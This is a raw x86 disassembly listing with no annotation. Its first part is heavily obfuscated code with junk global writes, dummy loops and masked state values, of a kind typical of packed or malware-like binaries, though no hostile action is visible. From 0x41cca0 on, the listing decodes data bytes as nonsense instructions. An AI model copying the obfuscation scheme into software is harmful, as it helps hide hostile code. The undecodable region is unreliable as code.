  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423923
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42390e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a44
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0xd0d7ebdc
  41ccad:	dec    ebx
  41ccae:	sub    DWORD PTR [eax],eax
  41ccb0:	xchg   edi,eax
  41ccb1:	cld    
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx-0x3b]
  41ccb9:	mov    ecx,0x1c68b05c
  41ccbe:	mov    eax,ds:0x7205a587
  41ccc3:	shl    esp,0xe1
  41ccc6:	call   0x4bba:0x5b75166f
  41cccd:	ins    DWORD PTR es:[edi],dx
  41ccce:	cmp    al,0xf6
  41ccd0:	mov    edx,DWORD PTR [edi+0x4c]
  41ccd3:	clc    
  41ccd4:	mov    eax,ds:0x70b1992f
  41ccd9:	aas    
  41ccda:	adc    BYTE PTR [ebp+0x757c4453],ch
  41cce0:	and    BYTE PTR [edx+0x1deffa1f],bh
  41cce6:	repz (bad) 
  41cce8:	xchg   esi,eax
  41cce9:	(bad)  
  41cceb:	jnp    0x41cce1
  41cced:	arpl   WORD PTR [edx],ax
  41ccef:	jecxz  0x41ccfc
  41ccf1:	pop    esp
  41ccf2:	sbb    al,0x7f
  41ccf4:	inc    esi
  41ccf5:	dec    ecx
  41ccf6:	inc    eax
  41ccf7:	imul   edx,DWORD PTR [eax+0x33],0xc45804fb
  41ccfe:	sub    DWORD PTR ds:0x30b1b726,0x5e
  41cd05:	sbb    al,0x2a
  41cd07:	mov    ds:0x421cf685,al
  41cd0c:	add    al,BYTE PTR [edi+0x78]
  41cd0f:	daa    
  41cd10:	test   al,0x55
  41cd12:	adc    ebp,0x77c96c95
  41cd18:	push   ecx
  41cd19:	das    
  41cd1a:	(bad)  
  41cd1b:	sti    
  41cd1c:	push   cs
  41cd1d:	or     eax,0xdb2ac28e
  41cd22:	js     0x41cd26
  41cd24:	dec    esi
  41cd25:	popa   
  41cd26:	or     eax,0x38f6ae38
  41cd2b:	rol    DWORD PTR [eax-0x1e],0x5e
  41cd2f:	icebp  
  41cd30:	jmp    0xb4b5:0x8ca375c3
  41cd37:	sub    cl,cl
  41cd39:	xchg   DWORD PTR [esi-0x38f6322a],edi
  41cd3f:	sbb    bl,bh
  41cd41:	push   edx
  41cd42:	add    bh,dh
  41cd44:	pusha  
  41cd45:	das    
  41cd46:	mov    al,0x7
  41cd48:	cmp    bh,BYTE PTR [edx-0x67]
  41cd4b:	mov    ebx,0xbdee89
  41cd50:	data16 sti 
  41cd52:	mov    dl,0xc
  41cd54:	push   ebp
  41cd55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd56:	retf   
  41cd57:	mov    ds:0xcef65d5b,eax
  41cd5c:	mov    bl,0xd
  41cd5e:	mov    esp,0x70e49848
  41cd63:	jae    0x41cd6e
  41cd65:	add    DWORD PTR [esi+0x57441cf5],esi
  41cd6b:	loop   0x41ccf4
  41cd6d:	pop    edx
  41cd6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd6f:	xchg   ebx,eax
  41cd70:	ins    DWORD PTR es:[edi],dx
  41cd71:	xchg   DWORD PTR [edi],eax
  41cd73:	xchg   ecx,eax
  41cd74:	or     eax,0x7312b33f
  41cd79:	(bad)  
  41cd7a:	adc    eax,DWORD PTR [esi+0x20c76d20]
  41cd80:	lods   al,BYTE PTR ds:[esi]
  41cd81:	and    DWORD PTR [ebp+ecx*2+0x40],ecx
  41cd85:	push   0x7243e784
  41cd8a:	mov    ecx,0x6ee1c61c
  41cd8f:	mov    BYTE PTR [eax],bh
  41cd91:	add    BYTE PTR [ebp-0x77292583],al
  41cd97:	xchg   ebp,eax
  41cd98:	dec    ebp
  41cd99:	adc    eax,0x852503d4
  41cd9e:	push   esi
  41cd9f:	cmp    BYTE PTR [edi],dh
  41cda1:	inc    ebx
  41cda2:	ret    
  41cda3:	out    0x55,eax
  41cda5:	js     0x41cdbb
  41cda7:	add    bh,BYTE PTR [edx-0x6]
  41cdaa:	mov    ecx,0xd0ea60c6
  41cdaf:	iret   
  41cdb0:	xor    esi,edi
  41cdb2:	sub    eax,DWORD PTR [ecx+0x54]
  41cdb5:	cs mov ebp,0x6a0dc31c
  41cdbb:	mov    esp,0xa42485f2
  41cdc0:	and    ecx,DWORD PTR [ebx+0x34]
  41cdc3:	fiadd  DWORD PTR [edx]
  41cdc5:	lahf   
  41cdc6:	loop   0x41cdf2
  41cdc8:	rcr    BYTE PTR [esi],1
  41cdca:	xor    eax,DWORD PTR [eax+0x681b997e]
  41cdd0:	push   cs
  41cdd1:	iret   
  41cdd2:	mov    edx,0x4ab1a10e
  41cdd7:	push   cs
  41cdd8:	retf   0x1883
  41cddb:	push   edx
  41cddc:	inc    esi
  41cddd:	test   al,0x82
  41cddf:	stos   BYTE PTR es:[edi],al
  41cde0:	jmp    DWORD PTR [ebp+ebp*8+0x478e3d64]
  41cde7:	pop    esi
  41cde8:	push   es
  41cde9:	sar    BYTE PTR [ebp+0x7d],1
  41cdec:	neg    BYTE PTR [ebx+eiz*2]
  41cdef:	ss icebp 
  41cdf1:	(bad)  
  41cdf2:	das    
  41cdf3:	mov    cs:0x1dd78022,eax
  41cdf9:	call   0x257afbec
  41cdfe:	jl     0x41cdc6
  41ce00:	imul   esi,esi,0xfffffffa
  41ce03:	pop    ecx
  41ce04:	push   0xffffff9a
  41ce06:	mov    ch,dh
  41ce08:	push   esi
  41ce09:	enter  0x480,0x9f
  41ce0d:	mov    al,0xf6
  41ce0f:	adc    ah,dl
  41ce11:	mov    bh,0xe9
  41ce13:	jmp    0x41ce46
  41ce15:	dec    eax
  41ce16:	pop    eax
  41ce17:	pop    eax
  41ce18:	adc    esi,DWORD PTR [eax]
  41ce1a:	call   0xefb8:0xe3c15250
  41ce21:	jle    0x41cdff
  41ce23:	xchg   edx,eax
  41ce24:	mov    DWORD PTR [edi+ebp*8-0x14],esi
  41ce28:	mov    eax,ds:0xe8c316b8
  41ce2d:	sahf   
  41ce2e:	in     eax,dx
  41ce2f:	out    0xdf,eax
  41ce31:	xchg   ecx,eax
  41ce32:	cmp    eax,DWORD PTR [ebx-0x345f1a1e]
  41ce38:	jmp    0x20770cbe
  41ce3d:	or     al,0x22
  41ce3f:	sbb    eax,0x7c56eb1a
  41ce44:	sar    ch,cl
  41ce46:	imul   edx,DWORD PTR [esi-0x2f],0x82d94607
  41ce4d:	into   
  41ce4e:	jmp    0x41ce80
  41ce50:	rcl    DWORD PTR [edi-0x64],1
  41ce53:	inc    eax
  41ce54:	mov    ecx,0x526a2bea
  41ce59:	push   0xf4ed7a7e
  41ce5e:	clc    
  41ce5f:	push   esi
  41ce60:	or     cl,BYTE PTR [ecx+0x60bab9dc]
  41ce66:	std    
  41ce67:	or     edx,ebp
  41ce69:	mov    ?,WORD PTR [eax-0x4e]
  41ce6c:	xchg   edx,eax
  41ce6d:	loope  0x41ce36
  41ce6f:	ror    DWORD PTR ds:0x6ad6b206,cl
  41ce75:	bnd jbe 0x41ceee
  41ce78:	mov    esp,0x6487dce9
  41ce7d:	scas   al,BYTE PTR es:[edi]
  41ce7e:	jo     0x41ce7f
  41ce80:	fdiv   DWORD PTR [ebp-0x3c]
  41ce84:	dec    edx
  41ce85:	and    eax,0x63f1a59d
  41ce8a:	or     eax,0x474e6490
  41ce8f:	xor    eax,0xcdc723e
  41ce94:	in     al,0x95
  41ce96:	cmp    al,0x56
  41ce98:	and    eax,0x45fb7ddf
  41ce9d:	jg     0x41ce7e
  41ce9f:	pusha  
  41cea0:	mov    al,ds:0x310e55a5
  41cea5:	ins    DWORD PTR es:[edi],dx
  41cea6:	and    bl,al
  41cea8:	(bad)  
  41cea9:	inc    edx
  41ceaa:	mov    ch,BYTE PTR [edx+0x7a83a0d4]
  41ceb0:	cmp    BYTE PTR [edi-0x3787d459],dh
  41ceb6:	inc    eax
  41ceb7:	xchg   edx,eax
  41ceb8:	mov    cl,bh
  41ceba:	jne    0x41ce52
  41cebc:	push   esi
  41cebd:	and    bh,BYTE PTR [esp+edx*1]
  41cec0:	jmp    0x41ce62
  41cec2:	xchg   esp,eax
  41cec3:	sub    BYTE PTR [ebp+esi*4-0x15],ah
  41cec7:	fcmovu st,st(0)
  41cec9:	pop    esp
  41ceca:	mov    ch,0x95
  41cecc:	mov    ch,0x19
  41cece:	mov    edx,0x3fc96093
  41ced3:	mov    bl,0xdc
  41ced5:	test   BYTE PTR [esi-0x232809fc],bh
  41cedb:	retf   0xb77b
  41cede:	jmp    0x156d:0x2ee853d1
  41cee5:	inc    ecx
  41cee6:	mov    ebp,0xa5ef5508
  41ceeb:	outs   dx,DWORD PTR ds:[esi]
  41ceec:	(bad)  
  41ceed:	cmp    al,0xec
  41ceef:	(bad)  
  41cef1:	(bad)  
  41cef2:	out    0xfc,al
  41cef4:	test   BYTE PTR [esi-0x56f714c6],bh
  41cefa:	stc    
  41cefb:	sub    BYTE PTR [eax],ah
  41cefd:	mov    cl,0x6e
  41ceff:	in     al,0x27
  41cf01:	lods   eax,DWORD PTR ds:[esi]
  41cf02:	jno    0x41cefc
  41cf04:	nop
  41cf05:	push   0x9f5dd562
  41cf0a:	leave  
  41cf0b:	jg     0x41cf19
  41cf0d:	aad    0x3f
  41cf0f:	push   ecx
  41cf10:	(bad)  
  41cf11:	cmp    esp,DWORD PTR [edx]
  41cf13:	push   0x3a7adbfa
  41cf18:	mov    ecx,0x259a62af
  41cf1d:	add    al,0xb7
  41cf1f:	fs mov ch,0xb
  41cf22:	xchg   ebx,eax
  41cf23:	pop    ebx
  41cf24:	std    
  41cf25:	sub    al,0x31
  41cf27:	(bad)  
  41cf28:	stos   DWORD PTR es:[edi],eax
  41cf29:	pop    edi
  41cf2a:	push   ebp
  41cf2b:	loopne 0x41ceb0
  41cf2d:	mov    ds:0x75c19574,al
  41cf32:	fidivr DWORD PTR [eax]
  41cf34:	sahf   
  41cf35:	push   edx
  41cf36:	in     eax,dx
  41cf37:	jae    0x41cf88
  41cf39:	cdq    
  41cf3a:	cmp    edx,esp
  41cf3c:	adc    al,0x25
  41cf3e:	in     eax,dx
  41cf3f:	and    esp,edi
  41cf41:	nop
  41cf42:	(bad)  
  41cf43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf44:	aas    
  41cf45:	cmp    al,0xf
  41cf47:	inc    ebx
  41cf48:	int3   
  41cf49:	xchg   ebp,eax
  41cf4a:	jmp    0x111e:0x20047a6d
  41cf51:	xchg   DWORD PTR [eax],ecx
  41cf53:	sub    ecx,ebx
  41cf55:	add    ecx,DWORD PTR [ebx-0x7b]
  41cf58:	pop    ebx
  41cf59:	mov    esp,0xbfd1aede
  41cf5e:	lods   eax,DWORD PTR ds:[si]
  41cf60:	sub    cl,cl
  41cf62:	xchg   DWORD PTR [edx+0x1a],ecx
  41cf65:	test   al,0x9c
  41cf67:	aaa    
  41cf68:	jnp    0x41cef2
  41cf6a:	clc    
  41cf6b:	ins    BYTE PTR es:[edi],dx
  41cf6c:	iret   
  41cf6d:	retf   0xad4a
  41cf70:	push   ss
  41cf71:	adc    esi,ebx
  41cf73:	adc    BYTE PTR [esp+edx*8],dh
  41cf76:	push   edx
  41cf77:	ror    ebp,1
  41cf79:	sub    BYTE PTR [esi+0x7d672936],al
  41cf7f:	and    esi,DWORD PTR [ecx]
  41cf81:	aaa    
  41cf82:	mov    ds:0x98b78f9b,eax
  41cf87:	xor    eax,edi
  41cf89:	mov    WORD PTR [edx],ss
  41cf8b:	(bad)  [edi]
  41cf8d:	js     0x41cff7
